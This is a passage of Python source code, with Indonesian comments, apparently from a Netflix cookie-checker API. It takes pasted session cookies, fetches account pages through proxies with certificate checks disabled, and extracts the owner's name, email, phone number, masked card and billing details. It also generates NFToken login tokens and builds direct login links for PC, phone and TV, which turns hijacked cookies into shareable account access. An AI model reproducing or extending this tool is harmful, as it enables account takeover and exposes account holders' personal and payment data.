        "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/124.0.0.0 Safari/537.36"),
        "Accept-Encoding": "identity",
    }
    try:
        r = session.get("https://www.netflix.com/account/membership",
                        headers=headers, proxies=proxy,
                        timeout=request_timeout, verify=False)
        if r.status_code == 200 and r.text:
            primary = extract_info(r.text)
            if not fallback_account_page or has_complete_account_info(primary):
                return r.text, r.status_code, primary
            try:
                fr = session.get("https://www.netflix.com/YourAccount",
                                 headers=headers, proxies=proxy,
                                 timeout=request_timeout, verify=False)
                fallback = extract_info(fr.text) if fr.status_code == 200 and fr.text else None
            except Exception:
                fallback = None
            return r.text, r.status_code, merge_info(primary, fallback)
        return r.text, r.status_code, None
    except Exception:
        return None, None, None


# ==================== NFToken ====================
def create_nftoken(cookies, attempts=3, proxy=None):
    if isinstance(cookies, str):
        netflix_id = cookies
    else:
        netflix_id = decode_netflix_value(cookies.get("NetflixId"))
    if not netflix_id:
        return None, None
    headers = NFTOKEN_HEADERS.copy()
    headers["Cookie"] = f"NetflixId={netflix_id}"
    for _ in range(attempts):
        try:
            r = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS,
                             headers=headers, timeout=30, proxies=proxy, verify=False)
            if r.status_code != 200:
                continue
            data = r.json()
            td = (((data.get("value") or {}).get("account") or {})
                  .get("token") or {}).get("default") or {}
            token = decode_netflix_value(td.get("token"))
            expires = td.get("expires")
            if token:
                if isinstance(expires, int) and len(str(expires)) == 13:
                    expires //= 1000
                return token, expires
        except Exception:
            continue
    return None, None


def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %I:%M:%S %p")
    except Exception:
        return str(expires)


# ==================== MAIN API FUNCTION ====================
def check_account(cookies_input: str = None, cookiesnetscape: str = None,
                  generate_nftoken: bool = True, proxy: dict = None) -> dict:
    """
    Fungsi utama untuk API.
    Input: cookies (string) atau cookiesnetscape (string).
    Output: dict lengkap berisi info akun + NFToken + links + plan folder.
    """
    raw = cookiesnetscape or cookies_input
    if not raw:
        return {"ok": False, "error": "Masukkan minimal salah satu: cookies atau cookiesnetscape."}

    bundles = extract_netflix_cookie_bundles(raw)
    if not bundles:
        return {"ok": False, "error": "Tidak bisa menemukan cookie Netflix yang valid."}

    bundle = bundles[0]
    cookies = bundle.get("cookies") or {}
    netscape_text = bundle.get("netscape_text") or ""

    if not has_required_netflix_cookies(cookies):
        return {"ok": False, "error": "Cookie NetflixId tidak ditemukan."}

    session = requests.Session()
    session.cookies.update(cookies)
    _, status_code, info = get_account_page(session, proxy=proxy, request_timeout=20)

    if status_code != 200 or not info or not info.get("countryOfSignup"):
        return {
            "ok": False,
            "error": "Gagal mengambil info akun. Cookie mungkin invalid / expired.",
            "status_code": status_code,
        }

    is_sub = is_subscribed_account(info)
    plan_key, plan_label = derive_plan_info(info, is_sub)

    token, expires = None, None
    if generate_nftoken:
        token, expires = create_nftoken(cookies, attempts=3, proxy=proxy)

    streams = _int_or_none(info.get("maxStreams"))
    quality = format_quality(plan_key, info.get("videoQuality"), streams)
    days_left = get_days_left(info.get("nextBillingDate"))
    country_code = info.get("countryOfSignup") or "UNKNOWN"

    response = {
        "ok": True,
        "account": {
            "name": info.get("accountOwnerName") or "UNKNOWN",
            "email": info.get("email") or "UNKNOWN",
            "country_code": country_code,
            "country_name": get_full_country_name(country_code) or "UNKNOWN",
            "member_since": format_member_since(info.get("memberSince")) or "UNKNOWN",
            "next_billing_date": format_display_date(info.get("nextBillingDate")) or "UNKNOWN",
            "days_left": days_left,
            "payment_method": info.get("paymentMethodType") or "UNKNOWN",
            "masked_card": info.get("maskedCard") or "UNKNOWN",
            "phone_number": normalize_phone_number(info.get("phoneNumber")) or "UNKNOWN",
            "email_verified": info.get("emailVerified") or "UNKNOWN",
            "phone_verified": info.get("phoneVerified") or "UNKNOWN",
            "membership_status": info.get("membershipStatus") or "UNKNOWN",
            "hold_status": info.get("holdStatus") or "UNKNOWN",
            "extra_member": info.get("showExtraMemberSection") or "UNKNOWN",
            "user_guid": info.get("userGuid") or "UNKNOWN",
        },
        "plan": {
            "key": plan_key,
            "label": plan_label,
            "raw_name": info.get("localizedPlanName") or "UNKNOWN",
            "price": info.get("planPrice") or "UNKNOWN",
            "quality": quality,
            "max_streams": streams if streams is not None else "UNKNOWN",
            "is_subscribed": is_sub,
            "folder": PLAN_FOLDERS.get(plan_key, "Unknown"),
        },
        "profiles": {
            "count": len([p for p in (info.get("profiles") or "").split(", ") if p]),
            "names": [p for p in (info.get("profiles") or "").split(", ") if p],
        },
        "cookie": {
            "string": "; ".join(f"{k}={v}" for k, v in cookies.items() if k in ("NetflixId",)),
            "netscape": netscape_text,
            "all_names": list(cookies.keys()),
        },
    }

    if token:
        response["nftoken"] = {
            "token": token,
            "expires": expires,
            "expires_formatted": format_expiry(expires),
            "links": {
                "pc":     f"https://netflix.com/browse?nftoken={token}",
                "phone":  f"https://netflix.com/unsupported?nftoken={token}",
                "tv":     f"https://netflix.com/tv2?nftoken={token}",
                "direct": f"https://netflix.com/account?nftoken={token}",
            },
        }
    else:
        response["nftoken"] = None

    return response
